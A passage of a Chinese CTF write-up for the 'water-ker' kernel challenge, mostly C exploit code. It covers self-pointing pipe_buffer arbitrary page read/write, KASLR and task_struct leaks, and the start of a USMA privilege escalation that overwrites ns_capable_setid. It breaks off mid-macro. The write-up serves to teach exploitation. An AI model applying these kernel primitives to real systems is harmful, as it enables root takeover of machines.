+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">write(pipe_fd[i][<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br><span class="line">write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;arttnba3&quot;</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p><em><strong>ps：因为开启了Random freelist，所以获取的self-pointing pipe_buffer的序号可能不是连续的</strong></em></p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/random.png" class title="random">
+
+<h3 id="任意读写"><a href="#任意读写" class="headerlink" title="任意读写"></a>任意读写</h3><p>现在我们有三个self-pointing pipe_buffer</p>
+<ul>
+<li>第一个管道用以进行内存空间中的任意读写，我们通过修改其 page 指针完成</li>
+<li>第二个管道用以修改第三个管道，使其写入的起始位置指向第一个管道</li>
+<li>第三个管道用以修改第一个与第二个管道，使得第一个管道的 pipe 指针指向指定位置，第二个管道的写入起始位置指向第三个管道</li>
+</ul>
+<p>继续exp</p>
+<ul>
+<li><p>先调用setup_evil_pipe进行一些初始化</p>
+<ul>
+<li><p>先进行一些覆盖</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(&amp;evil_2nd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;evil_3rd_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;evil_4th_buf, &amp;info_pipe_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第一个管道用于进行任意读写，先将read初始化为页开始，write初始化为页尾</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">evil_2nd_buf.len = <span class="number">0xff0</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe2.png" class title="pipe2">
+</li>
+<li><p>第二个管道用于修改第三个管道，所以利用第三个管道修改第二个管道，read，write都指向第三个管道（初始化时第三个管道的read指向第一个管道，write指向第二个管道）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">evil_3rd_buf.offset = TRD_PIPE_BUF_SZ * <span class="number">3</span>;</span><br><span class="line">evil_3rd_buf.len = <span class="number">0</span>;</span><br><span class="line">write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/pipe3.png" class title="pipe3">
+</li>
+<li><p>第三个管道用于修改第一第二个管道，所以write，read都指向第一个管道（在每次任意读写时初始化）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evil_4th_buf.offset = TRD_PIPE_BUF_SZ;</span><br><span class="line">evil_4th_buf.len = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>初始化完毕就可以任意读写了，先是读arbitrary_read_by_pipe</p>
+<ul>
+<li><p>书接上回，每次任意读写的时候要使用pipe2初始化pipe3</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read11.png" class title="read11">
+</li>
+<li><p>使用pipe3修改pipe1，指向要读写的页并初始化read指向页开始</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* page to read */</span></span><br><span class="line">evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">evil_2nd_buf.len = <span class="number">0x1ff8</span>;</span><br><span class="line">evil_2nd_buf.page = page_to_read;</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* hijack the 2nd pipe for arbitrary read */</span></span><br><span class="line">write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read22.png" class title="read22">
+
+<p>接下来的write是为了跳过pipe1，准备修改pipe2</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">      temp_zero_buf, </span><br><span class="line">      TRD_PIPE_BUF_SZ-<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read33.png" class title="read33">
+</li>
+<li><p>最开始pipe2用于初始化pipe3了，这里使用pipe3把pipe2再改回去</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read44.png" class title="read44">
+</li>
+<li><p>最终目的——把数据读出来</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* read out data */</span></span><br><span class="line">read(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/read55.png" class title="read55"></li>
+</ul>
+</li>
+<li><p>任意写arbitrary_write_by_pipe和任意读思路一致（除了pipe1的write的指向）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">arbitrary_write_by_pipe</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* page to write */</span></span><br><span class="line">    evil_2nd_buf.page = page_to_write;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>], &amp;evil_4th_buf, <span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_2nd_buf, <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], &amp;evil_3rd_buf, <span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="任意读写设计思路"><a href="#任意读写设计思路" class="headerlink" title="任意读写设计思路"></a>任意读写设计思路</h4><p>到利用uaf泄露page这一步都是惯常操作</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/uaf2.png" class title="uaf">
+
+<ul>
+<li><p>self-pointing：要达成任意页读写首先我们要能够更改page指针，要更改page指针就要知道pipe_buffer地址再让page指向pipe_buffer……听起来很像死循环(ˉ▽ˉ；)…</p>
+<p>但由于我们已经泄露了一个page地址，所以让这个page上的pipe_buffer-&gt;page指向自己就能解决以上问题</p>
+</li>
+<li><p>三个pipe的更改类似于一个这样的循环</p>
+<img src="/2023/11/30/2023%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81-water-ker/%E5%BE%AA%E7%8E%AF.png" class title="循环">
+
+<ul>
+<li>首先需要一个更改pipe1-&gt;page的pipe3</li>
+<li>还需要一个将pipe3复原的pipe2</li>
+<li>pipe2还需要复原（又双叒叕循环了(ˉ▽ˉ；)…），由于pipe3处于高物理地址处所以可以一口气完成更改pipe1和pipe2的任务</li>
+</ul>
+</li>
+<li><p>所以大概一个过程就是</p>
+<ul>
+<li>pipe2复原pipe3</li>
+<li>pipe3更改pipe1指向要读写的page</li>
+<li>pipe3复原pipe2</li>
+</ul>
+</li>
+</ul>
+<h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>需要获得两个基址：vmemmap基址和kernel基址</p>
+<ul>
+<li><p>vmemmap</p>
+<ul>
+<li>在内存大于1G时，KASLR的粒度是256MB（0x10000000），我们可以通过存在物理地址physmem_base + 0x9d000（vmemmap[157]）处的secondary_startup_64函数指针判断是否找到了kernel基址</li>
+<li>由于我们之前已经有了一个page的地址，我们可以先将这个page的地址256MB对齐作为vmemmap基址，如果vmemmap[157]处有secondary_startup_64函数指针则基址正确，否则vmemmap-&#x3D;256MB，继续</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> *comm_addr;</span><br><span class="line">  </span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  </span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Setting up kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">setup_evil_pipe();</span><br><span class="line">  </span><br><span class="line">vmemmap_base = (<span class="type">size_t</span>) info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0xe0</span>)) &#123;</span><br><span class="line">        kernel_base = buf[<span class="number">0</span>] -  <span class="number">0xe0</span>;</span><br><span class="line">        kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n&quot;</span></span><br><span class="line">               <span class="string">&quot;\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n&quot;</span>, </span><br><span class="line">               kernel_base, kernel_offset);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);</span><br></pre></td></tr></table></figure>
+
+<p><em>ps：关于kaslr的所有内容都是根据注释来的，不清楚原理，感觉要研究原理又要开始系统启动了捏~(￣▽￣)~*</em></p>
+</li>
+<li><p>current task_struct</p>
+<ul>
+<li><p>task_struct结构体有一个comm成员会记录进程的名称，是一个十六字节的字符数组</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>	comm[<span class="number">16</span>];	<span class="comment">/*  2960    16 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>prctl系统调用可以修改进程的名称，这个进程名之后会作为内存搜索的目标来定位task_struct</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* now seeking for the task_struct in kernel memory */</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking task_struct in memory...&quot;</span>);</span><br><span class="line">    </span><br><span class="line">prctl(PR_SET_NAME, <span class="string">&quot;arttnba3pwnn&quot;</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索comm，并根据comm定位task_struct，task_struct的ptraced指针是指向自己的，这样我们就能获取task_struct的地址</p>
+<p>因为task_struct是存在直接映射区（heap）上的，且在内存小于256M时heap_base &#x3D; heap_leak &amp; 0xfffffffff0000000，这样我们就能获得直接heap基址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = memmem(buf, <span class="number">0xf00</span>, <span class="string">&quot;arttnba3pwnn&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-61</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-60</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123;  <span class="comment">/* task-&gt;parent */</span></span><br><span class="line">    </span><br><span class="line">        <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        parent_task = comm_addr[<span class="number">-61</span>];</span><br><span class="line">    </span><br><span class="line">        <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">        current_task = comm_addr[<span class="number">-54</span>] - <span class="number">2528</span>;</span><br><span class="line">    </span><br><span class="line">        page_offset_base = (comm_addr[<span class="number">-54</span>]&amp;<span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">        page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">               (<span class="keyword">struct</span> page*) (vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">               page_offset_base);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">               <span class="string">&quot;0x%lx\n\n&quot;</span>, current_task);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>三种提权方法</p>
+<h4 id="USMA"><a href="#USMA" class="headerlink" title="USMA"></a>USMA</h4><p>考虑直接更改内核代码段(○´･д･)ﾉ</p>
+<p>但直接映射区对应的代码段区域没有w权限，直接写入会造成kernel panic</p>
+<p>改写代码段本质上是向对应的物理页写入数据，上文我们已经获得了task_struct的地址，我们可以考虑更改进程页表建立一个到内核代码段的映射，这样就能改写了：）</p>
+<p>方便起见先mmap一段地址，再改写这段地址的页表，这就是usma \ ^o^ &#x2F;</p>
+<ul>
+<li><p>先说明一下这个地址转换函数direct_map_addr_to_page_addr，用于将直接映射区的地址转化为所属页的page结构体地址（page_offset_base是直接映射区基址）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>先调用pgd_vaddr_resolve找页表地址</p>
+<ul>
+<li><p>从task_struct所在页读取内容（读两页），并获取mm和stack的地址，定位mm_struct所在的页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* read current task_struct */</span></span><br><span class="line">current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line">    </span><br><span class="line">tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">stack_addr = tsk_buf[<span class="number">4</span>] + <span class="number">0x3000</span>;</span><br><span class="line">mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);</span><br><span class="line">    </span><br><span class="line">mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>读mm_struct，定位页表pgd</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* read mm_struct */</span></span><br><span class="line">arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) mm_struct_page, buf);</span><br><span class="line">arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (mm_struct_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line">    </span><br><span class="line">mm_struct_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line">    </span><br><span class="line"><span class="comment">/* only this is a virtual addr, others in page table are all physical addr*/</span></span><br><span class="line">pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">       <span class="string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>mmap一段内存并且先往里面写点东西，因为mmap不会先分配内存页，第一次写入才会分配内存页，需要两页</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810eab50</span></span><br><span class="line">  </span><br><span class="line"><span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line"><span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                 MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">    err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">    kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>要更改的目标函数是ns_capable_setid，这里计算的是虚拟地址</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">       dst_vaddr);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>接下来就是调用vaddr_resolve_for_3_level查找ns_capable_setid对应的页表项，因为进程的页表也映射了内核空间</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>先看一些与页表有关的宏</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span 